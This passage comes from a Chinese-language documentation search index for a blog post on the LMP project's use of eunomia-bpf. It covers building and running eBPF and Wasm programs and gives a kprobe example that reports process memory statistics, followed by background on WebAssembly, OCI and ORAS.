\u8fd0\u884c\u5185\u6838\u7a0b\u5e8f","text":"<p>\u53ef\u4ee5\u4f7f\u7528<code>lmp run package.json</code>\u8fd0\u884c\u5185\u6838\u7a0b\u5e8f\uff0c\u6ca1\u6709\u7528\u6237\u7aef\u7a0b\u5e8f\u5bf9\u6570\u636e\u7684\u5904\u7406\u7684\u60c5\u51b5\u4e0b\uff0c\u8be5\u6846\u67b6\u4e0b\u5185\u6838\u7a0b\u5e8f\u5c06\u4f1a\u8f93\u51fa\u6240\u6709\u88ab output \u7684\u6570\u636e\uff1a</p> <pre><code>$ sudo lmp run ./package.json\nrunning and waiting for the ebpf events from ring buffer...\ntime pid ppid exit_code duration_ns comm filename exit_event\n</code></pre> <p>\u4e00\u5f00\u59cb\u60a8\u4e0d\u4f1a\u770b\u5230\u4efb\u4f55\u6570\u636e\uff0c\u53ea\u6709\u5f53\u5185\u6838\u7684\u8ddf\u8e2a\u70b9\u88ab\u89e6\u53d1\u65f6\uff0c\u8fd9\u91cc\u662f\u65b0\u7684\u8fdb\u7a0b\u88ab\u521b\u5efa\u6216\u9000\u51fa\u65f6\uff0c\u624d\u4f1a\u8f93\u51fa\u6570\u636e\u3002\u8fd9\u91cc\u65b0\u5efa\u4e86\u4e00\u4e2a\u865a\u62df\u7ec8\u7aef\uff0c\u8f93\u51fa\u4e86\u5982\u4e0b\u6570\u636e\uff1a</p> <pre><code>23:31:31 111788 109955 0 0 bash /bin/bash 0\n23:31:31 111790 111788 0 0 lesspipe /usr/bin/lesspipe 0\n...\n</code></pre>"},{"location":"blogs/lmp-eunomia/#4","title":"4. \u6dfb\u52a0\u7528\u6237\u6001\u7a0b\u5e8f","text":"<p>\u6211\u4eec\u63d0\u4f9b\u7684\u662f demo \u662f C \u8bed\u8a00\u7248\u672c\u7684 Wasm \u5f00\u53d1\u6846\u67b6\uff0c\u5728\u6784\u5efa\u597d\u7684\u5185\u6838\u9879\u76ee\u6587\u4ef6\u5939\u5185\uff0c\u4f7f\u7528 <code>sudo lmp gen-wasm-skel</code> \u751f\u6210\u4e00\u4e2a Wasm \u7528\u6237\u6001\u9879\u76ee\u6a21\u677f\uff0capp.c\u3001eunomia-include\u3001ewasm-skel.h \u8fd9\u4e9b\u6587\u4ef6\u4f1a\u88ab\u751f\u6210\u3002ewasm-skel.h \u662f\u88ab\u6253\u5305\u4e3a\u5934\u6587\u4ef6\u7684\u5185\u6838\u7a0b\u5e8f\uff0capp.c \u662f\u7528\u6237\u6001\u7a0b\u5e8f\u7684\u6a21\u677f\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5b83\u6765\u8fdb\u884c\u81ea\u5b9a\u4e49\u7684\u6570\u636e\u5904\u7406\uff0c\u8fd9\u91cc\u4e0d\u505a\u4fee\u6539\u3002</p> <pre><code>$ sudo lmp gen-wasm-skel\nmake\n  BPF      .output/client.bpf.o\n...\n</code></pre> <p>\u4f7f\u7528<code>sudo lmp build-wasm</code>\u6784\u5efa\u7528\u6237\u6001\u7a0b\u5e8f\uff0c\u751f\u6210 app.wasm \u6587\u4ef6</p> <pre><code>$ sudo lmp build-wasm\nmake\n  BPF      .output/client.bpf.o\n...\n</code></pre> <p>\u4f7f\u7528<code>lmp run app.wasm</code>\u8fd0\u884c\u7528\u6237\u6001\u7a0b\u5e8f\uff0cjson \u683c\u5f0f\u7684\u8f93\u51fa\u4e3a\u901a\u7528\u7684\u6570\u636e\u5904\u7406\u505a\u597d\u4e86\u51c6\u5907\uff1a</p> <pre><code>$ lmp run app.wasm\nrunning and waiting for the ebpf events from ring buffer...\n{\"pid\":112665,\"ppid\":109955,\"exit_code\":0,\"duration_ns\":0,\"comm\":\"bash\",\"filename\":\"/bin/bash\",\"exit_event\":0}\n{\"pid\":112667,\"ppid\":112665,\"exit_code\":0,\"duration_ns\":0,\"comm\":\"lesspipe\",\"filename\":\"/usr/bin/lesspipe\",\"exit_event\":0}\n{\"pid\":112668,\"ppid\":112667,\"exit_code\":0,\"duration_ns\":0,\"comm\":\"basename\",\"filename\":\"/usr/bin/basename\",\"exit_event\":0}\n...\n</code></pre>"},{"location":"blogs/lmp-eunomia/#ebpf","title":"\u53e6\u4e00\u4e2a\u4f8b\u5b50\uff1a\u4f7f\u7528 eBPF \u6253\u5370\u8fdb\u7a0b\u5185\u5b58\u4f7f\u7528\u72b6\u51b5","text":"<p>\u53ef\u4ee5\u5c06 bootstrap.bpf.c \u91cd\u547d\u540d\u4e3a procstat.bpf.c\uff0c\u5c06 bootstrap.h \u91cd\u547d\u540d\u4e3a procstat.h\uff0c\u7136\u540e\u7f16\u8bd1\u8fd0\u884c\u3002\u5bf9\u5e94\u7684\u6e90\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p>procstat.bpf.c</p> <pre><code>#include \"vmlinux.h\"\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n#include &lt;bpf/bpf_core_read.h&gt;\n#include \"procstat.h\"\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n\nstruct {\n __uint(type, BPF_MAP_TYPE_RINGBUF);\n __uint(max_entries, 256 * 1024);\n} rb SEC(\".maps\");\n\n\nSEC(\"kprobe/finish_task_switch\")\nint BPF_KPROBE(finish_task_switch, struct task_struct *prev)\n{\n struct event *e;\n struct mm_rss_stat rss = {};\n struct mm_struct *mms;\n long long *t;\n\n e = bpf_ringbuf_reserve(&amp;rb, sizeof(*e), 0);\n if (!e)\n  return 0;\n\n e-&gt;pid = BPF_CORE_READ(prev, pid);\n e-&gt;vsize = BPF_CORE_READ(prev, mm, total_vm);\n e-&gt;Vdata = BPF_CORE_READ(prev, mm, data_vm);\n e-&gt;Vstk = BPF_CORE_READ(prev, mm, stack_vm);\n e-&gt;nvcsw = BPF_CORE_READ(prev, nvcsw);\n e-&gt;nivcsw = BPF_CORE_READ(prev, nivcsw);\n\n rss = BPF_CORE_READ(prev, mm, rss_stat);\n t = (long long *)(rss.count);\n e-&gt;rssfile = *t;\n e-&gt;rssanon = *(t + 1);\n e-&gt;vswap = *(t + 2);\n e-&gt;rssshmem = *(t + 3);\n e-&gt;size = *t + *(t + 1) + *(t + 3);\n\n bpf_ringbuf_submit(e, 0);\n return 0;\n}\n</code></pre> <p>proc.h</p> <pre><code>#ifndef __BOOTSTRAP_H\n#define __BOOTSTRAP_H\n\n#define TASK_COMM_LEN 16\n#define MAX_FILENAME_LEN 127\n\nstruct event {\n/*\u8fdb\u7a0b\u5185\u5b58\u72b6\u6001\u62a5\u544a*/\n    pid_t pid;\n    long nvcsw;\n    long nivcsw;\n    long vsize;              //\u865a\u62df\u5185\u5b58\n    long size;               //\u7269\u7406\u5185\u5b58\n    long long rssanon;       //\u533f\u540d\u9875\u9762\n    long long rssfile;       //\u6587\u4ef6\u9875\u9762\n    long long rssshmem;      //\u5171\u4eab\u9875\u9762\n    long long vswap;         //\u4ea4\u6362\u9875\u9762\n    long long Hpages;        //hugetlbPages\n    long Vdata;              //Private data segments\n    long Vstk;               //User stack\n    long long VPTE;\n};\n#endif /* __BOOTSTRAP_H */\n</code></pre> <p>\u5177\u4f53\u7684\u4e0a\u62a5\u4e8b\u4ef6\u4fe1\u606f\u5728 event \u7ed3\u6784\u4f53\u4e2d\u5b9a\u4e49\uff1a</p> \u53c2\u6570 \u542b\u4e49 vsize \u8fdb\u7a0b\u4f7f\u7528\u7684\u865a\u62df\u5185\u5b58 size \u8fdb\u7a0b\u4f7f\u7528\u7684\u6700\u5927\u7269\u7406\u5185\u5b58 rssanon \u8fdb\u7a0b\u4f7f\u7528\u7684\u533f\u540d\u9875\u9762 rssfile \u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u6620\u5c04\u9875\u9762 rssshmem \u8fdb\u7a0b\u4f7f\u7528\u7684\u5171\u4eab\u5185\u5b58\u9875\u9762 vswap \u8fdb\u7a0b\u4f7f\u7528\u7684\u4ea4\u6362\u5206\u533a\u5927\u5c0f vdata \u8fdb\u7a0b\u4f7f\u7528\u7684\u79c1\u6709\u6570\u636e\u6bb5\u5927\u5c0f vpte \u8fdb\u7a0b\u9875\u8868\u5927\u5c0f vstk \u8fdb\u7a0b\u7528\u6237\u6808\u5927\u5c0f <p>\u6302\u8f7d\u70b9\u4e0e\u6302\u8f7d\u539f\u56e0\u5206\u6790\uff1a</p> <ul> <li>\u9996\u5148\uff0c\u83b7\u53d6\u8fdb\u7a0b\u7ea7\u522b\u5185\u5b58\u4f7f\u7528\u4fe1\u606f\u9700\u8981\u83b7\u53d6\u5230\u8fdb\u7a0b\u7684 task_struct \u7ed3\u6784\u4f53\uff0c\u5176\u4e2d\u5728 mm_struct \u6210\u5458\u4e2d\u5b58\u5728\u4e00\u4e2a\u4fdd\u5b58\u8fdb\u7a0b\u5f53\u524d\u5185\u5b58\u4f7f\u7528\u72b6\u6001\u7684\u6570\u7ec4\u7ed3\u6784\uff0c\u56e0\u6b64\u6709\u5173\u8fdb\u7a0b\u7684\u5927\u90e8\u5206\u5185\u5b58\u4f7f\u7528\u4fe1\u606f\u90fd\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u6570\u7ec4\u83b7\u5f97\u3002</li> <li>\u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u51fd\u6570\u7684\u63d2\u5165\u70b9\uff0c\u63d2\u5165\u70b9\u7684\u9009\u53d6\u5173\u7cfb\u5230\u6570\u636e\u51c6\u786e\u6027\u662f\u5426\u5f97\u5230\u4fdd\u8bc1\uff0c\u800c\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u7533\u8bf7\uff0c\u91ca\u653e\uff0c\u89c4\u6574\u7b49\u4ee3\u7801\u8def\u5f84\u4e0a\u90fd\u5b58\u5728\u9875\u9762\u72b6\u6001\u6539\u53d8\uff0c\u4f46\u662f\u6570\u91cf\u4fe1\u606f\u8fd8\u6ca1\u6709\u66f4\u65b0\u7684\u76f8\u5173\u7ed3\u6784\u4e2d\u7684\u60c5\u51b5\uff0c\u5982\u679c\u63d2\u5165\u70b9\u8fd9\u4e24\u8005\u4e2d\u95f4\uff0c\u6570\u636e\u5c31\u4f1a\u548c\u5b9e\u9645\u60c5\u51b5\u5b58\u5728\u5dee\u5f02\uff0c\u6240\u6709\u5728\u786e\u4fdd\u53ef\u4ee5\u83b7\u53d6\u5230\u8fdb\u7a0b PCB \u7684\u524d\u63d0\u4e0b\uff0c\u9009\u62e9\u5728\u8fdb\u7a0b\u8c03\u5ea6\u4ee3\u7801\u8def\u5f84\u4e0a\u8003\u8651\u3002\u800c finish_task_switch \u51fd\u6570\u662f\u65b0\u4e00\u4e2a\u8fdb\u7a0b\u7b2c\u4e00\u4e2a\u6267\u884c\u7684\u51fd\u6570\uff0c\u505a\u7684\u4e8b\u5374\u662f\u7ed9\u4e0a\u4e00\u4e2a\u88ab\u8c03\u5ea6\u51fa\u53bb\u7684\u8fdb\u7a0b\u505a\u6536\u5c3e\u5de5\u4f5c\uff0c\u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u7684\u53c2\u6570\u662f\u4e0a\u4e00\u4e2a\u8fdb\u7a0b\u7684 PCB\uff0c\u4ece\u8fd9\u5757\u83b7\u5f97\u4e0a\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u4fe1\u606f\u5c31\u53ef\u4ee5\u786e\u4fdd\u5728\u5b83\u6ca1\u6709\u518d\u6b21\u88ab\u8c03\u5ea6\u4e0a CPU \u6267\u884c\u7684\u8fd9\u6bb5\u65f6\u95f4\u5185\u7684\u5185\u5b58\u6570\u636e\u7a33\u5b9a\u6027\u3002</li> <li>\u56e0\u6b64\u6700\u540e\u9009\u62e9\u5c06\u7a0b\u5e8f\u6302\u8f7d\u5230 finish_task_switch \u51fd\u6570\u4e0a\u3002\u6570\u636e\u6765\u6e90\u6709\u4e24\u90e8\u5206\uff0c\u4e00\u4e2a\u662f mm_struct \u7ed3\u6784\u672c\u8eab\u5b58\u5728\u7684\u72b6\u6001\u4fe1\u606f\uff0c\u53e6\u4e00\u4e2a\u662f\u5728 mm_rss_stat \u7ed3\u6784\u4e2d\u3002</li> </ul> <p>\u4e5f\u53ef\u4ee5\u5728 bolipi \u7684\u5e73\u53f0\u4e2d\u5728\u7ebf\u7f16\u8bd1\uff0c\u5728\u7ebf\u4f53\u9a8c\u8fd0\u884c eBPF \u7a0b\u5e8f\uff1ahttps://bolipi.com/ebpf/home/online</p> <p>\u5b8c\u6574\u7684\u4ee3\u7801\u3001\u6587\u6863\u548c\u8fd0\u884c\u7ed3\u679c\u53ef\u4ee5\u5728 LMP \u4e2d eBPF_Supermarket \u5904\u627e\u5230\uff1aeBPF_Supermarket/Memory_Subsystem/memstat/procstat</p>"},{"location":"blogs/lmp-eunomia/#_2","title":"\u76f8\u5173\u80cc\u666f","text":"<p>LMP \u9879\u76ee\u7684\u6210\u7acb\u521d\u8877\u662f\uff1a</p> <ul> <li>\u9762\u5411 eBPF \u521d\u5b66\u8005\u548c\u7231\u597d\u8005\uff0c\u63d0\u4f9b eBPF \u5b66\u4e60\u8d44\u6599\u3001\u7a0b\u5e8f/\u9879\u76ee\u6848\u4f8b\uff0c\u6784\u5efa eBPF \u5b66\u4e60\u793e\u533a</li> <li>\u6210\u4e3a eBPF \u5de5\u5177\u96c6\u6563\u5730\uff0c\u6211\u4eec\u76f8\u4fe1\u6bcf\u4e00\u4f4d eBPF \u521d\u5b66\u8005\u548c\u7231\u597d\u8005\u90fd\u6709\u65e0\u9650\u7684\u521b\u9020\u529b</li> <li>\u5b75\u5316 eBPF \u60f3\u6cd5\u3001\u76f8\u5173\u5de5\u5177\u3001\u9879\u76ee</li> </ul> <p>LMP \u76ee\u524d\u5206\u4e3a\u56db\u4e2a\u5b50\u9879\u76ee\uff1a</p> <ul> <li>eBPF_Supermarket \u4e2d\u5305\u542b\u4e86\u5927\u91cf\u7531\u4e2a\u4eba\u5f00\u53d1\u8005\u7f16\u5199\u7684 eBPF \u5de5\u5177\uff0c\u8986\u76d6\u4e86\u7f51\u7edc\u3001\u6027\u80fd\u5206\u6790\u3001\u5b89\u5168\u7b49\u591a\u79cd\u529f\u80fd\uff1b</li> <li>eBPF_Hub \u662f\u89c4\u8303\u5316\u7684 eBPF \u7a0b\u5e8f\u5e93\uff0c\u53ef\u4ee5\u968f\u65f6\u4e0b\u8f7d\u8fd0\u884c\uff1b</li> <li>eBPF_Visualization \u662f\u4e3a eBPF \u7a0b\u5e8f\u7ba1\u7406\u800c\u5f00\u53d1\u7684 web \u7ba1\u7406\u7cfb\u7edf\uff0c\u805a\u7126 eBPF \u6570\u636e\u53ef\u89c6\u5316\u548c\u5185\u6838\u53ef\u89c6\u5316\uff1b</li> <li>eBPF_Documentation \u4e3a\u793e\u533a\u6536\u96c6\u3001\u68b3\u7406\u548c\u539f\u521b\u7684 eBPF \u76f8\u5173\u8d44\u6599\u548c\u6587\u6863\u3002</li> </ul> <p>\u5f53\u524d LMP \u9879\u76ee\u4e5f\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0c\u4f8b\u5982\u5bf9\u4e8e eBPF \u5de5\u5177\u7684\u5f00\u53d1\u8005\uff0c\u5b58\u5728\u975e\u5e38\u591a\u800c\u4e14\u590d\u6742\u7684\u7528\u6237\u6001\u53ef\u89c6\u5316\u3001\u5c55\u793a\u65b9\u6848\uff0c\u6709\u8bb8\u591a\u5957\u7cfb\u7edf\u63d0\u4f9b\u53ef\u89c6\u5316\u7684\u5b9e\u73b0\u5e76\u4e14\u6709\u591a\u79cd\u8bed\u8a00\u6df7\u5408\uff0c\u7f3a\u4e4f\u5c55\u793a\u6807\u51c6\u3001\u4e5f\u96be\u4ee5\u8fdb\u884c\u53ef\u89c6\u5316\u7684\u6574\u5408\u7b49\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u5c1d\u8bd5\u501f\u52a9 eunomia-bpf \u63d0\u4f9b\u7684\u7b26\u5408 OCI \u6807\u51c6\u7684 Wasm \u548c eBPF \u7a0b\u5e8f\uff0c\u63d0\u4f9b\u6807\u51c6\u5316\u3001\u9ad8\u53ef\u6269\u5c55\u6027\u7684\u57fa\u4e8e eBPF \u7684\u53ef\u89c6\u5316\u3001\u6570\u636e\u5c55\u793a\u3001\u5206\u6790\u5e73\u53f0\uff0c\u5229\u7528 ORAS \u7b80\u5316\u6269\u5c55 eBPF \u7684\u5206\u53d1\u3001\u52a0\u8f7d\u3001\u8fd0\u884c\u80fd\u529b\uff0c\u4e3a eBPF \u5de5\u5177\u7684\u5f00\u53d1\u8005\u548c\u4f7f\u7528\u8005\u63d0\u4f9b\u66f4\u52a0\u7b80\u5355\u3001\u9ad8\u6548\u7684\u4f53\u9a8c\u3002</p>"},{"location":"blogs/lmp-eunomia/#webassembly","title":"WebAssembly","text":"<p>WebAssembly \u662f\u4e00\u79cd\u65b0\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5728\u73b0\u4ee3\u7684\u7f51\u7edc\u6d4f\u89c8\u5668\u4e2d\u8fd0\u884c \uff0d \u5b83\u662f\u4e00\u79cd\u4f4e\u7ea7\u7684\u7c7b\u6c47\u7f16\u8bed\u8a00\uff0c\u5177\u6709\u7d27\u51d1\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u53ef\u4ee5\u63a5\u8fd1\u539f\u751f\u7684\u6027\u80fd\u8fd0\u884c\uff0c\u5e76\u4e3a\u8bf8\u5982 c\\c++ \u7b49\u8bed\u8a00\u63d0\u4f9b\u4e00\u4e2a\u7f16\u8bd1\u76ee\u6807\uff0c\u4ee5\u4fbf\u5b83\u4eec\u53ef\u4ee5\u5728 Web \u4e0a\u8fd0\u884c\u3002\u5b83\u4e5f\u88ab\u8bbe\u8ba1\u4e3a\u53ef\u4ee5\u4e0e JavaScript \u5171\u5b58\uff0c\u5141\u8bb8\u4e24\u8005\u4e00\u8d77\u5de5\u4f5c\u3002\u800c\u4e14\uff0c\u66f4\u68d2\u7684\u662f\uff0c\u8fd9\u662f\u901a\u8fc7 W3C WebAssembly Community Group \u5f00\u53d1\u7684\u4e00\u9879\u7f51\u7edc\u6807\u51c6\uff0c\u5e76\u5f97\u5230\u4e86\u6765\u81ea\u5404\u5927\u4e3b\u8981\u6d4f\u89c8\u5668\u5382\u5546\u7684\u79ef\u6781\u53c2\u4e0e\u3002</p> <p>\u5c3d\u7ba1 WebAssembly \u662f\u4e3a\u8fd0\u884c\u5728 Web \u4e0a\u8bbe\u8ba1\u7684\uff0c\u5b83\u4e5f\u53ef\u4ee5\u5728\u5176\u5b83\u7684\u73af\u5883\u4e2d\u826f\u597d\u5730\u8fd0\u884c\u3002\u5305\u62ec\u4ece\u7528\u4f5c\u6d4b\u8bd5\u7684\u6700\u5c0f\u5316 shell \uff0c\u5230\u5b8c\u5168\u7684\u5e94\u7528\u73af\u5883 \u2014\u2014 \u4f8b\u5982\uff1a\u5728\u6570\u636e\u4e2d\u5fc3\u7684\u670d\u52a1\u5668\u3001\u7269\u8054\u7f51\uff08IoT\uff09\u8bbe\u5907\u6216\u8005\u662f\u79fb\u52a8/\u684c\u9762\u5e94\u7528\u7a0b\u5e8f\u3002\u751a\u81f3\uff0c\u8fd0\u884c\u5d4c\u5165\u5728\u8f83\u5927\u7a0b\u5e8f\u91cc\u7684 WebAssembly \u4e5f\u662f\u53ef\u884c\u7684\u3002\u901a\u5e38\uff0c\u901a\u8fc7\u7ef4\u6301\u4e0d\u9700\u8981 Web API \u7684\u975e Web \u8def\u5f84\uff0cWebAssembly \u80fd\u591f\u5728\u8bb8\u591a\u5e73\u53f0\u4e0a\u7528\u4f5c\u4fbf\u643a\u5f0f\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u4e3a\u79fb\u690d\u6027\u3001\u5de5\u5177\u548c\u8bed\u8a00\u65e0\u5173\u6027\u5e26\u6765\u5de8\u5927\u7684\u597d\u5904\u3002\uff08\u56e0\u4e3a\u5b83\u652f\u6301 c\\c++ \u7ea7\u8bed\u4e49\uff09</p> <p>Wasm \u7684\u7f16\u8bd1\u548c\u90e8\u7f72\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p>\u200b wasm-compile-deploy</p>"},{"location":"blogs/lmp-eunomia/#ociopen-container-initiative","title":"OCI(Open Container Initiative)","text":"<p>\u5f00\u653e\u5bb9\u5668\u534f\u8bae(OCI)\u662f\u4e00\u4e2a\u8f7b\u91cf\u7ea7\uff0c\u5f00\u653e\u7684\u6cbb\u7406\u7ed3\u6784\uff0c\u4e3a\u5bb9\u5668\u6280\u672f\u5b9a\u4e49\u4e86\u89c4\u8303\u548c\u6807\u51c6\u3002\u5728 Linux \u57fa\u91d1\u4f1a\u7684\u652f\u6301\u4e0b\u6210\u7acb\uff0c\u7531\u5404\u5927\u8f6f\u4ef6\u4f01\u4e1a\u6784\u6210\uff0c\u81f4\u529b\u4e8e\u56f4\u7ed5\u5bb9\u5668\u683c\u5f0f\u548c\u8fd0\u884c\u65f6\u521b\u5efa\u5f00\u653e\u7684\u884c\u4e1a\u6807\u51c6\u3002\u5176\u4e2d\u5305\u62ec\u4e86\u4f7f\u7528 Container Registries \u8fdb\u884c\u5de5\u4f5c\u7684 API\uff0c\u6b63\u5f0f\u540d\u79f0\u4e3a OCI \u5206\u53d1\u89c4\u8303(\u53c8\u540d\u201cdistribution-spec\u201d)\u3002\u8fd9\u4e2a\u53d1\u5e03\u89c4\u8303\u662f\u57fa\u4e8e Docker \u516c\u53f8\u6700\u521d\u53d1\u5e03\u7684\u5f00\u6e90\u6ce8\u518c\u670d\u52a1\u5668\u7f16\u5199\u7684\uff0c\u5b83\u5b58\u5728\u4e8e GitHub \u7684distribution/distribution\uff08\u73b0\u5728\u662fCNCF\u9879\u76ee\uff09\u4e0a\u3002</p> <p>OCI \u76ee\u524d\u63d0\u51fa\u7684\u89c4\u8303\u6709\u5982\u4e0b\u8fd9\u4e9b\uff1a</p> \u540d\u79f0 \u7248\u672c Runtime Specification v1.0.2 Image Format v1.0.2 Distribution Specification v1.0.1 <p>\u5176\u4e2d runtime \u548c image \u7684\u89c4\u8303\u90fd\u5df2\u7ecf\u6b63\u5f0f\u53d1\u5e03\uff0c\u800c distribution \u7684\u8fd8\u5728\u5de5\u4f5c\u4e4b\u4e2d\u3002runtime \u89c4\u8303\u4e2d\u4ecb\u7ecd\u4e86\u5982\u4f55\u8fd0\u884c\u89e3\u538b\u7f29\u5230\u78c1\u76d8\u4e0a\u7684 <code>Filesystem Bundle</code>\u3002\u5728 OCI \u6807\u51c6\u4e0b\uff0c\u8fd0\u884c\u4e00\u4e2a\u5bb9\u5668\u7684\u8fc7\u7a0b\u5c31\u662f\u4e0b\u8f7d\u4e00\u4e2a OCI \u7684\u955c\u50cf\uff0c\u5c06\u5176\u89e3\u538b\u5230\u67d0\u4e2a <code>Filesystem Bundle</code> \u4e2d\uff0c\u7136\u540e\u67d0\u4e2a OCI Runtime \u5c31\u4f1a\u8fd0\u884c\u8fd9\u4e2a Bundle\u3002</p> <p>\u4f34\u968f\u7740 image spec \u4e0e distribution spec \u7684\u6f14\u5316\uff0c\u4eba\u4eec\u5f00\u59cb\u9010\u6b65\u8ba4\u8bc6\u5230\u9664\u4e86 Container Images \u4e4b\u5916\uff0cRegistries \u8fd8\u80fd\u591f\u7528\u6765\u5206\u53d1 Kubernetes Deployment Files, Helm Charts, docker-compose, CNAB \u7b49\u4ea7\u7269\u3002\u5b83\u4eec\u53ef\u4ee5\u5171\u7528\u540c\u4e00\u5957 API\uff0c\u540c\u4e00\u5957\u5b58\u50a8\uff0c\u5c06 Registries \u4f5c\u4e3a\u4e00\u4e2a\u4e91\u5b58\u50a8\u7cfb\u7edf\u3002\u8fd9\u5c31\u4e3a\u5e26\u6765\u4e86 OCI Artifacts \u7684\u6982\u5ff5\uff0c\u7528\u6237\u80fd\u591f\u628a\u6240\u6709\u7684\u4ea7\u7269\u90fd\u5b58\u50a8\u5728 OCI \u517c\u5bb9\u7684 Registiry \u5f53\u4e2d\u5e76\u8fdb\u884c\u5206\u53d1\u3002\u4e3a\u6b64\uff0cMicrosoft \u5c06 oras \u4f5c\u4e3a\u4e00\u4e2a client \u7aef\u5b9e\u73b0\u6350\u8d60\u7ed9\u4e86\u793e\u533a\uff0c\u5305\u62ec Harbor \u5728\u5185\u7684\u591a\u4e2a\u9879\u76ee\u90fd\u5728\u79ef\u6781\u7684\u53c2\u4e0e\u3002</p>"},{"location":"blogs/lmp-eunomia/#orasoci-registry-as-storage","title":"ORAS(OCI Registry As Storage)","text":"<p>Registries \u6b63\u5728\u9010\u6e10\u6f14\u53d8\u4e3a\u901a\u7528\u7684\u7ec4\u4ef6\u5b58\u50a8\u5e93\u3002\u4e3a\u4e86\u5b9e\u73b0\u8fd9\u4e00\u76ee\u6807\uff0cORAS \u9879\u76ee\u63d0\u4f9b\u4e86\u4e00\u79cd\u5c06 OCI Artifacts \u4ece OCI Registries \u63d0\u4ea4\u548c\u62c9\u53d6\u7684\u65b9\u6cd5\u3002\u6b63\u5728\u5bfb\u6c42\u901a\u7528 Registries \u5ba2\u6237\u7aef\u7684\u7528\u6237\u53ef\u4ee5\u4eceORAS CLI\u4e2d\u5f97\u5230\u5e2e\u52a9\uff0c\u800c\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u5728ORAS \u5ba2\u6237\u7aef\u7684\u5f00\u53d1\u5e93\u4e4b\u4e0a\u6784\u5efa\u81ea\u5df1\u7684\u5ba2\u6237\u7aef\u3002</p> <p>ORAS \u7684\u5de5\u4f5c\u539f\u7406\u4e0e\u60a8\u53ef\u80fd\u5df2\u7ecf\u719f\u6089\u7684\u5de5\u5177(\u5982 docker)\u7c7b\u4f3c\u3002\u5b83\u5141\u8bb8\u60a8\u5411 OCI Registries \u63a8\u9001(\u4e0a\u4f20)\u548c\u63d0\u53d6(\u4e0b\u8f7d)\u5185\u5bb9\uff0c\u5e76\u5904\u7406\u767b\u5f55(\u8eab\u4efd\u9a8c\u8bc1)\u548c\u4ee4\u724c\u6d41(\u6388\u6743)\u3002ORAS \u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\u5c06\u7126\u70b9\u4ece\u5bb9\u5668\u6620\u50cf\u8f6c\u79fb\u5230\u5176\u4ed6\u7c7b\u578b\u7684\u7ec4\u4ef6\u4e0a\u3002</p> <p>\u56e0\u6b64\uff0c\u9f13\u52b1\u65b0\u7684 OCI Artifacts \u7684\u4f5c\u8005\u5b9a\u4e49\u4ed6\u4eec\u81ea\u5df1\u7684\u7ec4\u4ef6\u5a92\u4f53\u7c7b\u578b\uff0c\u4ee5\u4f7f\u5f97\u4ed6\u4eec\u7684\u7528\u6237\u77e5\u9053\u5982\u4f55\u5bf9\u5176\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u5982\u679c\u60a8\u5e0c\u671b\u7acb\u5373\u5f00\u59cb\u53d1\u5e03 OCI Artifacts\uff0c\u8bf7\u67e5\u770bORAS CLI\u3002\u5e0c\u671b\u63d0\u4f9b\u7ed9\u81ea\u5df1\u7528\u6237\u4f53\u9a8c\u7684\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u4f7f\u7528\u4e00\u4e2a ORAS \u5ba2\u6237\u7aef\u5f00\u53d1\u5e93\u3002</p>"},{"location":"blogs/lmp-eunomia/#_3","title":"\u672a\u6765\u7684\u53d1\u5c55\u65b9\u5411","text":"<p>\u672a\u6765 LMP \u4f1a\u4e13\u6ce8\u4e8e\u66f4\u591a\u7684\u57fa\u4e8e eBPF \u7684\u5e94\u7528\u5de5\u5177\u548c\u5b9e\u8df5\u7684\u5f00\u53d1\uff1a</p> <ol> <li>\u8fdb\u4e00\u6b65\u5b8c\u5584 ORAS \u548c OCI \u955c\u50cf\u76f8\u5173\u7684\u652f\u6301\uff1b</li> <li>\u91cd\u6784\u5e76\u8fc1\u79fb\u73b0\u6709\u7684 eBPF \u5de5\u5177\uff0c\u63d0\u4f9b\u5b8c\u6574\u7684\u3001\u5f00\u7bb1\u5373\u7528\u7684\u5206\u6790\u5de5\u5177\u7ec4\u4ef6\uff0c\u4f8b\u5982\u6027\u80fd\u5de5\u7a0b\u7b49\u65b9\u9762\uff1b</li> <li>\u63a2\u7d22\u548c\u5b75\u5316\u66f4\u591a\u7684 eBPF \u60f3\u6cd5\u3001\u76f8\u5173\u5de5\u5177\u3001\u9879\u76ee\uff1b</li> </ol> <p>\u6211\u4eec\u6240\u57fa\u4e8e\u7684 eunomia-bpf \u9879\u76ee\u4e5f\u4f1a\u7ee7\u7eed\u5b8c\u5584\uff0c\u4e13\u6ce8\u4e8e\u63d0\u4f9b\u4e00\u4e2a\u5e95\u5c42\u7684 eBPF \u5f00\u53d1\u5e73\u53f0\u548c\u8fd0\u884c\u65f6\u57fa\u7840\u8bbe\u65bd\uff0c\u529b\u6c42\u5e26\u6765\u66f4\u597d\u7684\u5f00\u53d1\u548c\u79fb\u690d\u4f53\u9a8c\uff1a</p> <ol> <li>\u6d4b\u8bd5\u66f4\u591a\u5e73\u53f0\u548c\u5185\u6838\u7248\u672c\u7684\u652f\u6301\uff0c\u76ee\u524d\u5df2\u7ecf\u5728 <code>ARM64</code> \u548c <code>x86_64</code> \u4e0a\u6210\u529f\u79fb\u690d\u5e76\u8fd0\u884c\uff0c\u63a5\u4e0b\u6765\u4f1a\u5bf9\u4f4e\u5185\u6838\u7248\u672c\u3001Android\u3001RISC-V 